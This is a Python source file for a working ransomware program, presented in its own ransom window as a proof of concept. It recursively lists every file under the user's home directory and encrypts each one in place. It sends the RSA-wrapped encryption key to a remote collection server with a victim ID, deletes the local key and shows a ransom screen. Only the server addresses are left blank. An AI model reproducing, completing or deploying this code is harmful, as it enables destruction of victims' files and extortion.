import os,requests,time,random,sys,binascii,threading,string
from getpass import getuser
from cryptography.fernet import Fernet
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from tkinter import *
from tkinter import ttk

key = Fernet.generate_key()
f = Fernet(key)
user=getuser()

server=("")# Directory on the server of the program that stores the keys
serverrsa=("")# Directory on the private key server
directories=["C:\\Users\\"+user+"\\"] # Directories (more can be added)
iamexe=False # IF you want to use pyinstaller or something similar change this variable




me=sys.argv[0]
files=[]
idransom=("")



def Decrypt():
    f=Fernet(entrykey.get())
    for i in files:
        rb=open(i, "rb")
        tan=rb.read()
        new = f.decrypt(tan)
        newfiles=open(i, "wb")
        newfiles.write(new)
        newfiles.close()


def usermsg():
        global entrykey
        window = Tk()
        window.title('Ransomware')
        window.geometry('430x340')
        window.configure(background='black')
        randomkey = StringVar()

        txt = Label(foreground='yellow', background='black',font=("Arial", 20), text="UPS!!!")
        txt2 = Label(foreground='yellow', background='black',font=("Arial", 16), text='YOUR FILES HAVE BEEN ENCRYPTED!!!')
        txt3 = Message(foreground='black', background='white',font=("Arial", 11), text="Hello this is a PoC of a ransomware, in a real case all your documents like photos, videos, music etc been encrypted. \n Be very careful ; )!!!")
        txt4 = Label(foreground='yellow', background='black',font=("Arial", 12), text="KEY:")
        entrykey = Entry(width=36,textvariable=randomkey)
        decryptbutton = Button(text='RECOVER!!!',command=Decrypt)


        txt.pack()
        txt2.pack()
        txt3.pack()
        txt4.pack()
        entrykey.pack()
        decryptbutton.pack()
        window.mainloop()
def rsakey():
    r = requests.get(serverrsa)

    savekey=open("pubkey.pem", "w")
    savekey.write(r.text)
    savekey.close()
    sendkey()
def sendkey():
    global f
    global idransom
    readkey=open("pubkey.pem", "rb")
    publickey=RSA.importKey(readkey.read())
    encryptor = PKCS1_OAEP.new(publickey)
    encrypted = encryptor.encrypt(key)
    encrypted=(binascii.hexlify(encrypted))
    r = requests.get(server+ str(encrypted)+ " ID> " +idransom)
def genid():
    global idransom
    chars=string.ascii_uppercase
    for i in range(64):
        idransom+=random.choice(chars)

def ls(folder):
    global files
    for file in os.listdir(folder):
        if os.path.isdir(os.path.join(folder,file)):
            ls(os.path.join(folder,file))
        else:
            files.append(str(os.path.join(folder,file)))


def savetheransom():
    for i in directories:
        try:
            if iamexe==True:

                files.pop(files.index(i+"\\"+me.replace(".py", ".exe")))
            else:
                files.pop(files.index(i+"\\"+me))
            files.pop(files.index(i+"\\"+"pubkey.pem"))
        except:
            pass

def crypt():
    global key
    for i in files:
        try:
            rb=open(i, "rb")
            tan=rb.read()
            new = f.encrypt(tan)
            newfiles=open(i, "wb")
            newfiles.write(new)
            newfiles.close()
        except:
            pass

    del key

def main():

    idstart = threading.Thread(target=genid)
    idstart.start()
    rsakey()
    for i in directories:
        ls(i)
    savetheransom()
    crypt()

    usermsg()
if __name__ == "__main__":
    main()
